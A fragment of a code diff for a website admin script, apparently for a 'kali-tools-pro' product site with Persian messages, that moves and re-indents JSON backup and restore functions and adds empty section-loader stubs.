-            address: document.getElementById('footer-address-text').textContent,
-            phone: document.getElementById('footer-phone-text').textContent,
-            email: document.getElementById('footer-email-text').textContent,
-            copyright: document.getElementById('footer-copyright-text').textContent
-        },
-        backupDate: new Date().toISOString()
-    };
-    
-    const dataStr = JSON.stringify(data, null, 2);
-    const dataBlob = new Blob([dataStr], {type: 'application/json'});
-    
-    const url = URL.createObjectURL(dataBlob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `kali-tools-pro-backup-${new Date().toISOString().split('T')[0]}.json`;
-    a.click();
-    
-    URL.revokeObjectURL(url);
-    showToast('پشتیبان با موفقیت دریافت شد', 'success');
-}
-
-// Restore data
-function restoreData(file) {
-    const reader = new FileReader();
-    reader.onload = function(e) {
-        try {
-            const data = JSON.parse(e.target.result);
-            
-            // Restore data
-            if (data.hero) {
-                document.getElementById('hero-title').textContent = data.hero.title;
-                document.getElementById('hero-description').textContent = data.hero.description;
-            }
-            
-            if (data.features) {
-                features = data.features;
-                loadFeatures();
-            }
-            
-            if (data.gallery) {
-                galleryItems = data.gallery;
-                loadGalleryItems();
-            }
-            
-            if (data.videos) {
-                videos = data.videos;
-                loadVideos();
-            }
-            
-            if (data.products) {
-                products = data.products;
-                loadProducts();
-            }
-            
-            if (data.ethical) {
-                document.getElementById('ethical-title').textContent = data.ethical.title;
-                document.getElementById('ethical-description').textContent = data.ethical.description;
-                document.getElementById('ethical-warning').innerHTML = data.ethical.warning;
-                document.getElementById('ethical-footer').textContent = data.ethical.footer;
-            }
-            
-            if (data.footer) {
-                document.getElementById('footer-about-text').textContent = data.footer.about;
-                document.getElementById('footer-address-text').textContent = data.footer.address;
-                document.getElementById('footer-phone-text').textContent = data.footer.phone;
-                document.getElementById('footer-email-text').textContent = data.footer.email;
-                document.getElementById('footer-copyright-text').textContent = data.footer.copyright;
-            }
-            
-            // Save all to localStorage
-            saveToServer('features', features);
-            saveToServer('gallery', galleryItems);
-            saveToServer('videos', videos);
-            saveToServer('products', products);
-            
-            updateAdminStats();
-            showToast('دادهها با موفقیت بازیابی شدند', 'success');
-        } catch (error) {
-            console.error('Restore error:', error);
-            showToast('خطا در بازیابی دادهها. فایل معتبر نیست.', 'error');
+        // Load features admin
+        function loadFeaturesAdmin() {
+            // Features are already loaded in the form
         }
-    };
-    reader.readAsText(file);
-}
 
+        // Load ethical admin
+        function loadEthicalAdmin() {
+            // Ethical content is already loaded in the form
+        }
+
+        // Load footer admin
+        function loadFooterAdmin() {
+            // Footer content is already loaded in the form
+        }
+
+        // Load hero admin
+        function loadHeroAdmin() {
+            // Hero content is already loaded in the form
+        }
+
+        // Backup data
+        function backupData() {
+            const data = {
+                hero: {
+                    title: document.getElementById('hero-title').textContent,
+                    description: document.getElementById('hero-description').textContent
+                },
+                features: features,
+                gallery: galleryItems,
+                videos: videos,
+                products: products,
+                ethical: {
+                    title: document.getElementById('ethical-title').textContent,
+                    description: document.getElementById('ethical-description').textContent,
+                    warning: document.getElementById('ethical-warning').innerHTML,
+                    footer: document.getElementById('ethical-footer').textContent
+                },
+                footer: {
+                    about: document.getElementById('footer-about-text').textContent,
+                    address: document.getElementById('footer-address-text').textContent,
+                    phone: document.getElementById('footer-phone-text').textContent,
+                    email: document.getElementById('footer-email-text').textContent,
+                    copyright: document.getElementById('footer-copyright-text').textContent
+                },
+                backupDate: new Date().toISOString()
+            };
+            
+            const dataStr = JSON.stringify(data, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            
+            const url = URL.createObjectURL(dataBlob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `kali-tools-pro-backup-${new Date().toISOString().split('T')[0]}.json`;
+            a.click();
+            
+            URL.revokeObjectURL(url);
+            showToast('پشتیبان با موفقیت دریافت شد', 'success');
+        }
+
+        // Restore data
+        function restoreData(file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                try {
+                    const data = JSON.parse(e.target.result);
+                    
+                    // Restore data
+                    if (data.hero) {
+                        document.getElementById('hero-title').textContent = data.hero.title;
+                        document.getElementById('hero-description').textContent = data.hero.description;
+                    }
+                    
+                    if (data.features) {
+                        features = data.features;
+                        loadFeatures();
+                    }
+                    
+                    if (data.gallery) {
+                        galleryItems = data.gallery;
+                        loadGalleryItems();
+                    }
+                    
+                    if (data.videos) {
+                        videos = data.videos;
+                        loadVideos();
+                    }
+                    
+                    if (data.products) {
+                        products = data.products;
+                        loadProducts();
+                    }
+                    
+                    if (data.ethical) {
+                        document.getElementById('ethical-title').textContent = data.ethical.title;
+                        document.getElementById('ethical-description').textContent = data.ethical.description;
+                        document.getElementById('ethical-warning').innerHTML = data.ethical.warning;
+                        document.getElementById('ethical-footer').textContent = data.ethical.footer;
+                    }
+                    
+                    if (data.footer) {
+                        document.getElementById('footer-about-text').textContent = data.footer.about;
+                        document.getElementById('footer-address-text').textContent = data.footer.address;
+                        document.getElementById('footer-phone-text').textContent = data.footer.phone;
+                        document.getElementById('footer-email-text').textContent = data.footer.email;
+                        document.getElementById('footer-copyright-text').textContent = data.footer.copyright;
+                    }
+                    
+                    // Save all to localStorage
+                    saveToServer('features', features);
+                    saveToServer('gallery', galleryItems);
+                    saveToServer('videos', videos);
+                    saveToServer('products', products);
+                    
+                    updateAdminStats();
+                    showToast('دادهها با موفقیت بازیابی شدند', 'success');
+                } catch (error) {
+                    console.error('Restore error:', error);
+                    showToast('خطا در بازیابی دادهها. فایل معتبر نیست.', 'error');
+                }
+            };
+            reader.readAsText(file);
+        }
     </script>
 </body>
 </html>
